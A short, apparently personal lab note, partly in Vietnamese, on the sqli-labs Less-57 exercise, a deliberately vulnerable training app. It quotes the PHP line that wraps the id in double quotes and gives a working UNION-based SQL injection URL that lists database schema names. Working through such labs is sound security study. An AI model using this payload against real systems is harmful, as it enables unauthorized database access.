- code 

```
$id= '"'.$id.'"';
```

- Làm bình thường với `"`

```
http://10.10.10.171/sqli-labs/Less-57/?id=0" union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```
